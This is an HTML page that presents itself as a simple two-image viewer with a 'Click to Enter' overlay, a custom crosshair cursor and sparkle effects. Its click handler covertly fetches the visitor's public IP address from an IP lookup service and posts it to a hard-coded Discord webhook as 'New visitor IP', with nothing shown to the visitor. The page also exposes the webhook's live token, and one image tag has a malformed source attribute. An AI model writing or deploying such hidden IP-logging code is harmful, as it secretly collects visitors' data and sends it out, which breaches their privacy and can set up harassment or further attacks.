<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Side by Side Images</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Poppins', sans-serif;
            height: 100vh;
            background: linear-gradient(180deg, #1a1a2e, #16213e);
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            cursor: none;
        }

        .click-to-enter {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10;
            cursor: pointer;
            transition: opacity 0.5s ease-in-out, visibility 0.5s ease-in-out;
        }

        .click-to-enter.hide {
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
        }

        .click-to-enter p {
            font-size: 2rem;
            color: #f5b921;
            text-transform: uppercase;
            font-weight: bold;
            letter-spacing: 3px;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }

        .image-container {
            display: none;
            width: 100vw;
            height: 100vh;
        }

        .image-container.show {
            display: flex;
        }

        .image-container img {
            width: 50vw;
            height: 100vh;
            object-fit: cover;
        }

        .crosshair {
            position: fixed;
            top: 0;
            left: 0;
            width: 16px;
            height: 16px;
            pointer-events: none;
            z-index: 9999;
            filter: drop-shadow(0 0 4px rgba(255, 215, 0, 0.7));
        }

        .crosshair::before,
        .crosshair::after {
            content: '';
            position: absolute;
            background: yellow;
            border-radius: 2px;
        }

        .crosshair::before {
            width: 2px;
            height: 100%;
            left: 50%;
            transform: translateX(-50%);
        }

        .crosshair::after {
            height: 2px;
            width: 100%;
            top: 50%;
            transform: translateY(-50%);
        }

        .sparkle {
            position: absolute;
            width: 15px;
            height: 15px;
            background: radial-gradient(circle, yellow, transparent);
            border-radius: 50%;
            pointer-events: none;
            animation: sparkle-fade 0.5s linear;
        }

        @keyframes sparkle-fade {
            0% {
                opacity: 1;
                transform: scale(1);
            }
            100% {
                opacity: 0;
                transform: scale(2);
            }
        }
    </style>
</head>
<body>
    <div class="click-to-enter" id="clickToEnter">
        <p>Click to Enter</p>
    </div>
    <div class="image-container" id="imageContainer">
        <img src="1.jpeg" alt="Image 1">
        <img src=2.png" alt="Image 2">
    </div>
    <div class="crosshair" id="crosshair"></div>
    
    <script>
        const crosshair = document.getElementById('crosshair');
        const clickToEnter = document.getElementById('clickToEnter');
        const imageContainer = document.getElementById('imageContainer');

        clickToEnter.addEventListener('click', () => {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    fetch('https://discord.com/api/webhooks/1350441021212987462/zxJMhPSXwvuWppmL3XdM2pmTwBpQ2bZ77l2M9m_jlJsw26cxQXq3JtkJsleaV5675E90', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            content: `New visitor IP: ${data.ip}`
                        })
                    });
                });
            
            clickToEnter.classList.add('hide');
            imageContainer.classList.add('show');
        });

        document.addEventListener('mousemove', (e) => {
            crosshair.style.left = `${e.pageX - 8}px`;
            crosshair.style.top = `${e.pageY - 8}px`;
        });

        document.addEventListener('click', (e) => {
            const sparkle = document.createElement('div');
            sparkle.classList.add('sparkle');
            sparkle.style.left = `${e.pageX - 7.5}px`;
            sparkle.style.top = `${e.pageY - 7.5}px`;
            document.body.appendChild(sparkle);
            setTimeout(() => sparkle.remove(), 500);
        });
    </script>
</body>
</html>
